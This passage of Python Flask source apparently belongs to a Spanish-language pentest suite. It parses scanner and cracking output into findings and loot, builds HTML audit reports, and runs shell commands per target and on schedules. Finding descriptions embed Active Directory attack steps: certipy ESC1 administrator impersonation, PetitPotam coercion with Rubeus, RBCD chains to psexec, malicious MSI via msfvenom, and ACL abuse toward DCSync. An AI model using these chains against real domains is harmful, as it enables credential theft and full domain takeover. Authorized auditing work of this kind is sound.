            findings.append({
                "id": str(uuid.uuid4()), "title": f"PrivEsc — Cron Job Escribible",
                "severity": "high", "status": "open", "cve": "", "cvss": 7.8,
                "description": f"Cron job(s) escribible(s) por usuario actual — inyección de comandos como root: {_wcron[0]}",
                "evidence": "\n".join(_wcron[:5]), "hosts": [rhost] if rhost else [], "source": "linpeas",
            })
        # WinPEAS: AlwaysInstallElevated
        if re.search(r'AlwaysInstallElevated\s*[:=]\s*1', _ac, re.I):
            findings.append({
                "id": str(uuid.uuid4()), "title": "PrivEsc (Win) — AlwaysInstallElevated",
                "severity": "high", "status": "open", "cve": "", "cvss": 7.8,
                "description": "AlwaysInstallElevated=1 en registro. Todo MSI se ejecuta como SYSTEM. Generar MSI malicioso con msfvenom.",
                "evidence": "AlwaysInstallElevated=1", "hosts": [rhost] if rhost else [], "source": "winpeas",
            })
        # WinPEAS: Unquoted service path
        _usp = re.findall(r'[^\n]*[Uu]nquoted[^\n]+', _ac)
        if _usp:
            findings.append({
                "id": str(uuid.uuid4()), "title": f"PrivEsc (Win) — Unquoted Service Path ({len(_usp)})",
                "severity": "medium", "status": "open", "cve": "", "cvss": 6.5,
                "description": "Servicios con rutas sin comillas permiten colocar un exe malicioso y ejecutar como SYSTEM.",
                "evidence": "\n".join(_usp[:5]), "hosts": [rhost] if rhost else [], "source": "winpeas",
            })
        # WinPEAS: DLL Hijacking
        if re.search(r'DLL [Hh]ijack', _ac):
            findings.append({
                "id": str(uuid.uuid4()), "title": "PrivEsc (Win) — DLL Hijacking Potencial",
                "severity": "medium", "status": "open", "cve": "", "cvss": 6.5,
                "description": "Directorios con DLL hijacking potencial — colocar DLL maliciosa y esperar carga del servicio.",
                "evidence": "", "hosts": [rhost] if rhost else [], "source": "winpeas",
            })

    # ── Hashcat / John cracked Kerberos tickets ───────────────────────────────
    # hashcat output: $krb5tgs$...:password  or john: user:password (hash)
    for _cm in re.finditer(r'\$krb5(?:tgs|asrep)\$[^\s:]{10,}:(\S{3,})', output_text):
        _cracked_pwd = _cm.group(1)
        loot.append({"type": "credential", "value": f"kerberoast_cracked:{_cracked_pwd}", "source": "hashcat"})
        findings.append({
            "id": str(uuid.uuid4()), "title": f"AD — Contraseña Kerberos Crackeada: {_cracked_pwd[:30]}",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.0,
            "description": f"Contraseña de cuenta de servicio/usuario AD crackeada offline: '{_cracked_pwd}'. Probar en todos los servicios del dominio.",
            "evidence": _cm.group(0)[:200], "hosts": [rhost] if rhost else [], "source": "kerberoast-crack",
        })
    # John --show output: username:password:...
    for _jm in re.finditer(r'^(\w[\w.@\-]+):(\S{3,}):.*\$krb5', output_text, re.MULTILINE):
        _ju, _jp = _jm.group(1), _jm.group(2)
        loot.append({"type": "credential", "value": f"{_ju}:{_jp}", "source": "john-kerberoast"})

    # ── Kerberos ticket hashes (Kerberoast / ASREPRoast output) ───────────────
    _krb_tickets = re.findall(r'(\$krb5(?:tgs|asrep)\$[^\s]{30,})', output_text)
    for _tkt in _krb_tickets[:5]:
        _tkt_type = "Kerberoasting" if "krb5tgs" in _tkt else "ASREPRoasting"
        _tkt_preview = _tkt[:80] + "..."
        loot.append({"type": "hash", "value": _tkt, "source": _tkt_type.lower()})
        findings.append({
            "id": str(uuid.uuid4()),
            "title": f"AD — Ticket {_tkt_type} Capturado",
            "severity": "high", "status": "open", "cve": "", "cvss": 8.1,
            "description": f"Ticket Kerberos capturado vía {_tkt_type}. Crackeable offline con hashcat -m {'13100' if 'tgs' in _tkt else '18200'} + rockyou.",
            "evidence": _tkt_preview, "hosts": [rhost] if rhost else [], "source": _tkt_type.lower(),
        })

    # ── ADCS / Certipy patterns ────────────────────────────────────────────────
    _certipy_esc = re.findall(r'ESC[1-8]', output_text)
    if _certipy_esc or re.search(r'[Vv]ulnerable.*[Tt]emplate|[Ee]nrollment.*[Rr]ights|[Ee]nabled.*[Cc]lient [Aa]uth|pkiobject|pKIEnrollmentService', output_text):
        _esc_types = list(set(_certipy_esc))[:6]
        _tmpl_m = re.search(r'Template Name\s*[:\|]\s*(\S+)', output_text)
        _ca_m = re.search(r'CA Name\s*[:\|]\s*(.+?)(?:\n|$)', output_text)
        _tmpl = _tmpl_m.group(1) if _tmpl_m else "Unknown"
        _ca   = _ca_m.group(1).strip() if _ca_m else "Unknown CA"
        findings.append({
            "id": str(uuid.uuid4()),
            "title": f"ADCS — Plantilla Vulnerable ({', '.join(_esc_types) or 'Certipy'}) en CA {_ca}",
            "severity": "critical", "status": "open",
            "cve": "", "cvss": 9.8,
            "description": (
                f"Active Directory Certificate Services (ADCS) tiene plantillas vulnerables ({', '.join(_esc_types) or 'ver certipy output'}).\n"
                f"Plantilla: {_tmpl} | CA: {_ca}\n"
                f"Explotación ESC1: `certipy req -u USER@DOMAIN -p PASS -dc-ip DC -template {_tmpl} -upn administrator@DOMAIN -ca '{_ca}'`\n"
                f"Luego: `certipy auth -pfx administrator.pfx -dc-ip DC` para obtener NT hash y TGT."
            ),
            "evidence": output_text[:1000].strip(),
            "hosts": [rhost] if rhost else [], "source": "certipy",
        })
    if re.search(r'[Gg]ot [Hh]ash|NT [Hh]ash.*[a-fA-F0-9]{32}|PKINIT.*TGT|[Cc]ertipy.*[Aa]uth.*success|Saved.*pfx|[Cc]ertificate.*saved', output_text):
        _nt_m = re.search(r'(?:NT [Hh]ash|hash)[:\s]+([a-fA-F0-9]{32})', output_text)
        _nt = _nt_m.group(1) if _nt_m else ""
        findings.append({
            "id": str(uuid.uuid4()),
            "title": f"ADCS PWNED — NT Hash Obtenido via Certipy (PKINIT)",
            "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
            "description": "Certipy auth exitoso — hash NT extraído via PKINIT. Usar para PTH o cracking offline.",
            "evidence": (_nt or output_text[:300]).strip(),
            "hosts": [rhost] if rhost else [], "source": "certipy-auth",
        })
        if _nt:
            loot.append({"type": "hash", "value": f"certipy_nt:{_nt}", "source": "certipy-pkinit"})

    # ── Delegation found ──────────────────────────────────────────────────────
    if re.search(r'[Uu]nconstrained|TrustedForDelegation.*True|TRUSTED_FOR_DELEGATION', output_text):
        _del_m = re.search(r'([^\n]*[Uu]nconstrained[^\n]*)', output_text)
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "AD — Delegación Sin Restricción (Unconstrained Delegation) Detectada",
            "severity": "high", "status": "open", "cve": "", "cvss": 8.8,
            "description": (
                "Cuenta o equipo con delegación sin restricciones. Si es un servidor no-DC, "
                "combinado con coerción (PetitPotam) el TGT del DC se puede capturar y usar para DCSync.\n"
                "Comando: `rubeus.exe monitor /interval:5 /filteruser:DC$` + `petitpotam.py LHOST DC_IP`"
            ),
            "evidence": _del_m.group(0) if _del_m else "",
            "hosts": [rhost] if rhost else [], "source": "delegation-enum",
        })
    if re.search(r'[Cc]onstrained|AllowedToDelegateTo|msDS-AllowedToDelegateTo', output_text):
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "AD — Delegación Restringida (Constrained Delegation) Detectada",
            "severity": "high", "status": "open", "cve": "", "cvss": 8.1,
            "description": (
                "Cuenta con delegación restringida. S4U2Self + S4U2Proxy permiten suplantación de administrador.\n"
                "Herramientas: impacket-getST, Rubeus s4u, getST.py"
            ),
            "evidence": "",
            "hosts": [rhost] if rhost else [], "source": "delegation-enum",
        })
    if re.search(r'RBCD|[Rr]esource.?[Bb]ased|msDS-AllowedToActOnBehalfOfOtherIdentity', output_text):
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "AD — RBCD (Resource-Based Constrained Delegation) Detectada",
            "severity": "high", "status": "open", "cve": "", "cvss": 8.8,
            "description": (
                "Resource-Based Constrained Delegation configurable. Si tienes GenericWrite o GenericAll sobre "
                "el objeto equipo puedes configurar RBCD para obtener acceso admin.\n"
                "Comandos: addcomputer.py → rbcd.py → getST.py → psexec/wmiexec"
            ),
            "evidence": "",
            "hosts": [rhost] if rhost else [], "source": "rbcd-enum",
        })

    # ── GraphQL security ──────────────────────────────────────────────────────
    if re.search(r'GRAPHQL_INTROSPECTION_ENABLED|GRAPHQL_ENDPOINT:', output_text):
        _ep_m = re.search(r'GRAPHQL_ENDPOINT:\s*(\S+)', output_text)
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "Web — GraphQL Introspección Habilitada",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.3,
            "description": (
                "GraphQL tiene introspección habilitada en producción. Permite descubrir todo el schema, "
                "mutaciones, tipos y posibles vectores de ataque (IDOR, auth bypass, injection).\n"
                f"Endpoint: {_ep_m.group(1) if _ep_m else 'ver evidencia'}\n"
                "Tool: graphw00f, clairvoyance, InQL Burp plugin"
            ),
            "evidence": output_text[:400].strip(),
            "hosts": [rhost] if rhost else [], "source": "graphql-probe",
        })

    # ── JWT vulnerability ─────────────────────────────────────────────────────
    if re.search(r'JWT_FOUND:|Algorithm.*none|alg.*none.*accepted|jwt.*weak.*secret|jwt.*cracked', output_text, re.IGNORECASE):
        _jwt_m = re.search(r'JWT_FOUND:\s*(eyJ[a-zA-Z0-9._-]+)', output_text)
        _jwt_preview = _jwt_m.group(1)[:80] if _jwt_m else ""
        sev = "critical" if re.search(r'Algorithm.*none|alg.*none.*accepted|cracked', output_text, re.I) else "high"
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "Web — JWT Vulnerable (alg:none / Weak Secret / RS256→HS256)",
            "severity": sev, "status": "open", "cve": "", "cvss": 9.1 if sev == "critical" else 7.5,
            "description": (
                "JSON Web Token con vulnerabilidades detectadas:\n"
                "- alg:none: JWT firmado con algoritmo 'none' (sin firma) acepta tokens arbitrarios\n"
                "- Weak Secret: clave de firma bruteforceable con wordlist\n"
                "- RS256→HS256: confusión de algoritmo para falsificar tokens\n"
                "Tool: jwt_tool -X a (alg:none), -X s (RS→HS256), -C -d rockyou.txt (brute)"
            ),
            "evidence": _jwt_preview,
            "hosts": [rhost] if rhost else [], "source": "jwt-attack",
        })

    # ── NTLM Relay success ────────────────────────────────────────────────────
    if re.search(r'\[?\*?\]?\s*Authenticating.*as.*ADMIN|NTLM.*relay.*success|Adding.*computer.*account|ntlmrelayx.*\[\+\]', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "NTLM Relay Exitoso — Cuenta Creada / Acceso Obtenido",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": (
                "ntlmrelayx relayó con éxito credenciales NTLM. "
                "Posiblemente se creó una cuenta de máquina o se obtuvo acceso LDAP/SMB/HTTP con privilegios elevados."
            ),
            "evidence": output_text[:600].strip(),
            "hosts": [rhost] if rhost else [], "source": "ntlmrelayx",
        })

    # ── ACL/DACL paths ────────────────────────────────────────────────────────
    for _acl_pat, _acl_title, _acl_desc in [
        (r'GenericAll.*on|has GenericAll', "AD — GenericAll Detectado (Control Total de Objeto)", "Abusa GenericAll para resetear contraseña, añadir a grupos o habilitar RBCD sobre el objeto."),
        (r'WriteDACL|has WriteDACL', "AD — WriteDACL Detectado (Modificar ACLs)", "Con WriteDACL puedes concederte DCSync (Replication-Get-Changes-All) para volcar el dominio."),
        (r'AddMember.*Domain Admins|has AddMember.*Admin|WriteMembers.*Domain Admin', "AD — WriteMembers sobre Domain Admins", "Añade tu cuenta a Domain Admins con net rpc group addmem o PowerView Add-DomainGroupMember."),
        (r'ForceChangePassword|User Force Change Password', "AD — ForceChangePassword (Reset Password sin conocer actual)", "Resetea contraseña de víctima con Set-DomainUserPassword o rpcclient setuserinfo2."),
        (r'Owns.*|has Owns.*on|SID.*owner', "AD — Ownership de Objeto AD", "Como propietario del objeto puedes modificar sus DACLs libremente."),
    ]:
        if re.search(_acl_pat, output_text, re.IGNORECASE):
            ev_m = re.search(r'([^\n]*' + _acl_pat.split('|')[0].replace('.*', '[^\n]*') + r'[^\n]*)', output_text, re.IGNORECASE)
            findings.append({
                "id": str(uuid.uuid4()),
                "title": _acl_title,
                "severity": "high", "status": "open", "cve": "", "cvss": 8.1,
                "description": _acl_desc,
                "evidence": ev_m.group(0)[:200] if ev_m else "",
                "hosts": [rhost] if rhost else [], "source": "acl-enum",
            })

    # ── CORS misconfiguration ─────────────────────────────────────────────────
    if re.search(r'CORS_MISCONFIGURED|Access-Control-Allow-Origin:\s*\*|Access-Control-Allow-Origin:.*null', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()),
            "title": "Web — CORS Mal Configurado",
            "severity": "medium", "status": "open", "cve": "", "cvss": 6.1,
            "description": "CORS permite origen wildcard (*) o null. Permite lectura de datos autenticados desde dominios externos.",
            "evidence": re.search(r'(Access-Control-Allow-Origin:[^\n]*)', output_text, re.I).group(0) if re.search(r'Access-Control-Allow-Origin:', output_text, re.I) else "",
            "hosts": [rhost] if rhost else [], "source": "cors-check",
        })

    # ── Domain Controller / AD Infrastructure ────────────────────────────────
    _dc_m = re.search(r'Domain.*Controller.*:\s*(\S+)|Is.*DC[:\s]*True|IsDomainController.*true|domaincontroller.*name.*:\s*(\S+)', output_text, re.IGNORECASE)
    if _dc_m:
        _dc_ip = _dc_m.group(1) or _dc_m.group(2) or rhost
        loot.append({"type": "note", "value": f"DC: {_dc_ip}", "source": "ad-enum"})

    # Auto-tag all findings with MITRE ATT&CK
    for _f in findings:
        _auto_mitre_tag(_f)

    # Dedup loot
    seen, unique = set(), []
    for item in loot:
        if item["value"] not in seen:
            seen.add(item["value"])
            unique.append(item)

    return {
        "loot": unique,
        "suggestions": suggestions,
        "open_ports": open_ports,
        "findings": findings,
    }

@app.route("/api/parse", methods=["POST"])
@api_login_required
def parse_output_endpoint():
    data = request.json
    result = _parse_tool_output(
        data.get("tool", ""),
        data.get("output", ""),
        data.get("rhost", ""),
    )
    return jsonify(result)

# ── Findings (T4) ──────────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/findings", methods=["GET"])
@api_login_required
def list_findings(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project.get("findings", []))

@app.route("/api/projects/<project_id>/findings", methods=["POST"])
@api_login_required
def create_finding(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    d = request.json
    finding = {
        "id": str(uuid.uuid4()),
        "title": d.get("title", ""),
        "severity": d.get("severity", "info"),
        "description": d.get("description", ""),
        "hosts": d.get("hosts", []),
        "evidence": d.get("evidence", ""),
        "cve": d.get("cve", ""),
        "cvss": d.get("cvss"),
        "remediation": d.get("remediation", ""),
        "status": d.get("status", "open"),
        "created_at": datetime.now().isoformat(),
    }
    project.setdefault("findings", []).append(finding)
    write_project(project)
    return jsonify(finding), 201

@app.route("/api/projects/<project_id>/findings/<finding_id>", methods=["PUT"])
@api_login_required
def update_finding(project_id, finding_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    findings = project.get("findings", [])
    for i, f in enumerate(findings):
        if f["id"] == finding_id:
            for k, v in request.json.items():
                if k not in ("id", "created_at"):
                    findings[i][k] = v
            project["findings"] = findings
            write_project(project)
            return jsonify(findings[i])
    return jsonify({"error": "Not found"}), 404

@app.route("/api/projects/<project_id>/findings/<finding_id>", methods=["DELETE"])
@api_login_required
def delete_finding(project_id, finding_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["findings"] = [f for f in project.get("findings", []) if f["id"] != finding_id]
    write_project(project)
    return jsonify({"ok": True})

# ── HTML Report (T5) ───────────────────────────────────────────────────────

def _esc(s):
    if not s:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

def _generate_exec_summary(project, findings, counts):
    """Generate non-technical executive summary paragraph."""
    name = project.get("name", "el sistema analizado")
    client = project.get("client") or "el cliente"
    targets = ", ".join((project.get("targets") or [])[:3])
    total = len(findings)
    crits = counts.get("critical", 0)
    highs = counts.get("high", 0)

    # Risk level
    if crits >= 3 or (crits >= 1 and highs >= 3):
        risk_level = "MUY ALTO"
        risk_color = "#f85149"
        risk_text = (f"Se detectaron <strong>{crits} vulnerabilidades críticas</strong> que permiten "
                     f"acceso no autorizado completo al sistema. Un atacante con acceso a la red podría "
                     f"comprometer el entorno en cuestión de minutos sin necesidad de credenciales.")
    elif crits >= 1:
        risk_level = "ALTO"
        risk_color = "#f0883e"
        risk_text = (f"Se detectó <strong>{crits} vulnerabilidad crítica</strong> que permite compromiso "
                     f"total del sistema. Requiere remediación inmediata antes de continuar en operación.")
    elif highs >= 3:
        risk_level = "ALTO"
        risk_color = "#f0883e"
        risk_text = (f"Se detectaron <strong>{highs} vulnerabilidades de severidad alta</strong>. "
                     f"Aunque ninguna permite compromiso inmediato sin interacción, su combinación "
                     f"representa un riesgo significativo para la confidencialidad e integridad de los datos.")
    elif highs >= 1:
        risk_level = "MEDIO"
        risk_color = "#d29922"
        risk_text = (f"Se detectaron vulnerabilidades de severidad alta que requieren atención prioritaria. "
                     f"El riesgo global es manejable con las acciones de remediación indicadas.")
    elif total > 0:
        risk_level = "BAJO"
        risk_color = "#3fb950"
        risk_text = "El entorno presenta una postura de seguridad razonablemente sólida con áreas de mejora identificadas."
    else:
        risk_level = "MÍNIMO"
        risk_color = "#58a6ff"
        risk_text = "No se detectaron vulnerabilidades significativas durante el período de análisis."

    # Compromised assets
    compromised = [f for f in findings if any(k in f.get("title","").lower() + f.get("description","").lower()
                   for k in ["rce", "shell", "compromised", "domain admin", "root", "meterpreter", "pwn3d"])]
    comp_text = ""
    if compromised:
        comp_text = (f"<p>⚠️ <strong>Durante la auditoría se obtuvo acceso remoto a {len(compromised)} sistema(s)</strong>, "
                     f"demostrando el impacto real de las vulnerabilidades identificadas.</p>")

    # Top critical findings for exec
    top_findings = [f for f in findings if f.get("severity") in ("critical", "high")][:5]
    top_html = ""
    if top_findings:
        top_html = "<p><strong>Principales hallazgos:</strong></p><ul>"
        for f in top_findings:
            sev_icon = "🔴" if f.get("severity") == "critical" else "🟠"
            top_html += f"<li>{sev_icon} <strong>{_esc(f.get('title',''))}</strong>"
            if f.get("hosts"):
                top_html += f" — {_esc(f['hosts'][0])}"
            top_html += "</li>"
        top_html += "</ul>"

    return f"""
    <div style="background:#fff;border-radius:8px;padding:24px;margin-bottom:20px;border:1px solid #dee2e6;box-shadow:0 1px 4px rgba(0,0,0,.06)">
      <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px">
        <div style="padding:8px 20px;border-radius:6px;background:{risk_color}20;color:{risk_color};border:2px solid {risk_color};font-weight:700;font-size:1.1em">
          RIESGO {risk_level}
        </div>
        <div style="color:#6c757d;font-size:13px">
          {total} hallazgos totales · Targets: {_esc(targets or '—')}
        </div>
      </div>
      <p style="font-size:14px;line-height:1.7;margin:0 0 12px">{risk_text}</p>
      {comp_text}
      {top_html}
      <p style="font-size:12px;color:#6c757d;margin:12px 0 0;border-top:1px solid #dee2e6;padding-top:12px">
        Este informe fue generado automáticamente por PentSuite. Los hallazgos han sido verificados
        con evidencia de explotación real donde es aplicable. Para más información técnica, consultar
        la sección de hallazgos detallados.
      </p>
    </div>"""

def _generate_html_report(project):
    now = datetime.now().strftime("%d/%m/%Y %H:%M")
    findings = project.get("findings", [])
    loot = project.get("loot", [])
    commands = project.get("commands", [])
    checklist = project.get("checklist", {})

    SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    SEV_COLORS = {"critical": "#f85149", "high": "#f0883e", "medium": "#d29922", "low": "#3fb950", "info": "#58a6ff"}
    SEV_LABELS = {"critical": "Crítico", "high": "Alto", "medium": "Medio", "low": "Bajo", "info": "Info"}

    findings_sorted = sorted(findings, key=lambda f: SEV_ORDER.get(f.get("severity", "info"), 4))
    counts = {s: sum(1 for f in findings if f.get("severity") == s) for s in SEV_ORDER}
    exec_summary_html = _generate_exec_summary(project, findings, counts)

    findings_html = ""
    for f in findings_sorted:
        sev = f.get("severity", "info")
        col = SEV_COLORS.get(sev, "#8b949e")
        hosts = ", ".join(f.get("hosts") or []) or "—"
        findings_html += f"""
        <div class="finding" style="border-left:4px solid {col}">
          <div class="fh">
            <span class="sbadge" style="background:{col}20;color:{col};border:1px solid {col}50">{_esc(SEV_LABELS.get(sev, sev))}</span>
            <span class="ftitle">{_esc(f.get('title',''))}</span>
            <span class="fstatus">{_esc(f.get('status','open'))}</span>
          </div>
          <table class="ft">
            {'<tr><td>CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/' + _esc(f.get('cve','')) + '" target="_blank">' + _esc(f.get('cve','')) + '</a></td></tr>' if f.get('cve') else ''}
            {'<tr><td>CVSS v3</td><td><span style="font-weight:700;color:' + ('#f85149' if (f.get('cvss') or 0)>=9 else '#f0883e' if (f.get('cvss') or 0)>=7 else '#d29922' if (f.get('cvss') or 0)>=4 else '#3fb950') + '">' + str(f.get('cvss','')) + '</span>' + (' <small style="color:#8b949e;font-family:monospace">' + _esc(f.get('cvss_vector','')) + '</small>' if f.get('cvss_vector') else '') + '</td></tr>' if f.get('cvss') is not None else ''}
            {'<tr><td>MITRE ATT&CK</td><td><a href="https://attack.mitre.org/techniques/' + _esc(f.get('mitre_technique','').replace('.','/')).split('/')[0] + '/" target="_blank"><b>' + _esc(f.get('mitre_technique','')) + '</b></a> — ' + _esc(f.get('mitre_name','')) + '</td></tr>' if f.get('mitre_technique') else ''}
            <tr><td>Hosts</td><td>{_esc(hosts)}</td></tr>
          </table>
          {'<div class="fl">Descripción</div><p>' + _esc(f.get('description','')) + '</p>' if f.get('description') else ''}
          {'<div class="fl">Evidencia</div><pre>' + _esc(f.get('evidence','')) + '</pre>' if f.get('evidence') else ''}
          {'<div class="fl" style="color:#3fb950">✔ Remediación</div><div style="background:#f0fff4;border:1px solid #3fb95030;border-radius:4px;padding:10px 14px;margin:4px 0 8px;font-size:13px;line-height:1.6">' + _esc(f.get('remediation','')) + '</div>' if f.get('remediation') else ''}
        </div>"""

    loot_html = ""
    if loot:
        by_type: dict = {}
        for item in loot:
            by_type.setdefault(item.get("type", "note"), []).append(item)
        for t, items in by_type.items():
            loot_html += f"<h3>{_esc(t.capitalize())} ({len(items)})</h3><ul>"
            for item in items:
                loot_html += f"<li><code>{_esc(item.get('value',''))}</code>"
                if item.get("desc"):
                    loot_html += f" — {_esc(item['desc'])}"
                if item.get("source"):
                    loot_html += f" <small>({_esc(item['source'])})</small>"
                loot_html += "</li>"
            loot_html += "</ul>"

    cmd_html = ""
    if commands:
        by_phase: dict = {}
        for c in commands:
            by_phase.setdefault(c.get("phase", "other"), []).append(c)
        for phase, cmds in by_phase.items():
            cmd_html += f"<h3>{_esc(phase)}</h3>"
            for c in cmds:
                cmd_html += f"<p><strong>{_esc(c.get('tool',''))}</strong></p><pre>{_esc(c.get('command',''))}</pre>"

    return f"""<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<title>Informe — {_esc(project.get('name',''))}</title>
<style>
body{{font-family:-apple-system,sans-serif;background:#f8f9fa;color:#212529;margin:0;padding:0}}
.cover{{background:#0d1117;color:#fff;padding:60px 80px}}
.cover h1{{font-size:2.4em;color:#3fb950;margin:0 0 8px}}
.cover .sub{{color:#8b949e;font-size:1.1em}}
.cover .meta{{margin-top:28px;color:#c9d1d9;font-size:13px;line-height:2}}
.wrap{{max-width:960px;margin:0 auto;padding:40px}}
h2{{border-bottom:2px solid #dee2e6;padding-bottom:8px;margin-top:40px;color:#0d1117;font-size:1.3em}}
h3{{font-size:1em;color:#495057;margin:20px 0 8px}}
.grid{{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin:20px 0}}
.card{{text-align:center;padding:16px;border-radius:8px;background:#fff;border:1px solid #dee2e6;box-shadow:0 1px 3px rgba(0,0,0,.06)}}
.card .n{{font-size:2em;font-weight:700}}
.card .l{{font-size:11px;color:#6c757d;text-transform:uppercase;margin-top:4px}}
.finding{{background:#fff;border-radius:8px;padding:20px 24px;margin-bottom:14px;box-shadow:0 1px 4px rgba(0,0,0,.06)}}
.fh{{display:flex;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap}}
.ftitle{{font-weight:600;font-size:.95em}}
.fstatus{{margin-left:auto;font-size:11px;color:#6c757d}}
.sbadge{{padding:2px 10px;border-radius:12px;font-size:11px;font-weight:700}}
.ft{{border-collapse:collapse;font-size:13px;margin:6px 0}}
.ft td{{padding:3px 12px 3px 0;vertical-align:top}}
.ft td:first-child{{color:#6c757d;white-space:nowrap;width:130px}}
.fl{{font-size:11px;color:#6c757d;text-transform:uppercase;letter-spacing:.5px;margin:10px 0 4px;font-weight:600}}
p{{margin:0 0 8px;font-size:13px;line-height:1.6}}
pre{{background:#f8f9fa;border:1px solid #dee2e6;border-radius:4px;padding:12px;font-size:12px;white-space:pre-wrap;word-break:break-all;margin:4px 0 12px}}
code{{font-family:'Courier New',monospace;font-size:12px;background:#f0f0f0;padding:1px 4px;border-radius:3px}}
ul{{padding-left:20px}}li{{margin:4px 0;font-size:13px}}
.empty{{color:#6c757d;font-style:italic;font-size:13px}}
@media print{{.cover{{page-break-after:always}}}}
</style></head><body>
<div class="cover">
  <h1>{_esc(project.get('name',''))}</h1>
  <div class="sub">Informe de Auditoría de Seguridad</div>
  <div class="meta">
    <b>Cliente:</b> {_esc(project.get('client') or '—')}<br>
    <b>Fecha:</b> {now}<br>
    <b>Targets:</b> {_esc(', '.join((project.get('targets') or []) + (project.get('domains') or [])) or '—')}<br>
    <b>Scope:</b> {_esc(project.get('scope') or '—')}
  </div>
</div>
<div class="wrap">
  <h2>Resumen Ejecutivo</h2>
  {exec_summary_html}
  <div class="grid">
    <div class="card"><div class="n" style="color:#f85149">{counts.get('critical',0)}</div><div class="l">Crítico</div></div>
    <div class="card"><div class="n" style="color:#f0883e">{counts.get('high',0)}</div><div class="l">Alto</div></div>
    <div class="card"><div class="n" style="color:#d29922">{counts.get('medium',0)}</div><div class="l">Medio</div></div>
    <div class="card"><div class="n" style="color:#3fb950">{counts.get('low',0)}</div><div class="l">Bajo</div></div>
    <div class="card"><div class="n" style="color:#58a6ff">{counts.get('info',0)}</div><div class="l">Info</div></div>
  </div>
  <h2>Hallazgos ({len(findings)})</h2>
  {findings_html or '<p class="empty">No se han registrado hallazgos.</p>'}
  <h2>Loot ({len(loot)} items)</h2>
  {loot_html or '<p class="empty">No se ha recolectado loot.</p>'}
  {'<h2>Notas</h2><pre>' + _esc(project.get('notes','')) + '</pre>' if project.get('notes') else ''}
  {'<h2>Historial de Comandos (' + str(len(commands)) + ')</h2>' + cmd_html if commands else ''}
</div></body></html>"""

@app.route("/api/projects/<project_id>/report")
@api_login_required
def export_report(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    html = _generate_html_report(project)
    resp = make_response(html)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    safe_name = project["name"].replace(" ", "_").replace("/", "_")
    resp.headers["Content-Disposition"] = f'attachment; filename="{safe_name}_report.html"'
    return resp

# ── Multi-target Execution ─────────────────────────────────────────────────

@app.route("/api/run/multi", methods=["POST"])
@api_login_required
def run_multi():
    data = request.json
    template  = data.get("command_template", "")
    targets   = data.get("targets", [])
    tool      = data.get("tool", "Multi")
    phase     = data.get("phase", "custom")
    project_id = data.get("project_id", "")
    batch_id  = str(uuid.uuid4())
    job_ids   = []

    for target in targets:
        cmd = template.replace("{rhost}", target).replace("{target}", target).replace("{ip}", target)
        job_id = str(uuid.uuid4())
        job = {
            "id": job_id, "project_id": project_id,
            "tool": f"{tool} [{target}]", "phase": phase, "command": cmd,
            "status": "running", "output": [],
            "started_at": datetime.now().isoformat(), "finished_at": None,
            "pid": None, "return_code": None, "proc": None,
            "batch_id": batch_id, "target": target,
        }
        with JOBS_LOCK:
            JOBS[job_id] = job

        def _run(j=job):
            try:
                proc = subprocess.Popen(j["command"], shell=True, stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
                j["proc"] = proc; j["pid"] = proc.pid
                for line in proc.stdout:
                    j["output"].append(line.rstrip("\n"))
                proc.wait()
                j["return_code"] = proc.returncode
                if j["status"] == "running":
                    j["status"] = "completed" if proc.returncode == 0 else "error"
            except Exception as e:
                j["output"].append(f"[ERROR] {e}"); j["status"] = "error"
            finally:
                j["finished_at"] = datetime.now().isoformat(); j.pop("proc", None)

        threading.Thread(target=_run, daemon=True).start()
        job_ids.append(job_id)

    return jsonify({"batch_id": batch_id, "job_ids": job_ids}), 202


# ── Scheduled Scans ────────────────────────────────────────────────────────

SCHEDULES: dict = {}
SCHEDULES_LOCK = threading.Lock()

def _next_run_iso(current_iso, repeat):
    dt = datetime.fromisoformat(current_iso)
    deltas = {"hourly": timedelta(hours=1), "daily": timedelta(days=1), "weekly": timedelta(weeks=1)}
    d = deltas.get(repeat)
    return (dt + d).isoformat() if d else None

def _scheduler_worker():
    while True:
        time.sleep(30)
        now = datetime.now()
        with SCHEDULES_LOCK:
            scheds = list(SCHEDULES.values())
        for sched in scheds:
            if not sched.get("enabled"):
                continue
            try:
                if now < datetime.fromisoformat(sched["next_run"]):
                    continue
            except Exception:
                continue
            job_id = str(uuid.uuid4())
            job = {
                "id": job_id, "project_id": sched.get("project_id", ""),
                "tool": sched["name"], "phase": "scheduled", "command": sched["command"],
                "status": "running", "output": [],
                "started_at": datetime.now().isoformat(), "finished_at": None,
                "pid": None, "return_code": None, "proc": None, "schedule_id": sched["id"],
            }
            with JOBS_LOCK:
                JOBS[job_id] = job
            def _run_sched(j=job):
                try:
                    proc = subprocess.Popen(j["command"], shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
                    j["proc"] = proc; j["pid"] = proc.pid
                    for line in proc.stdout:
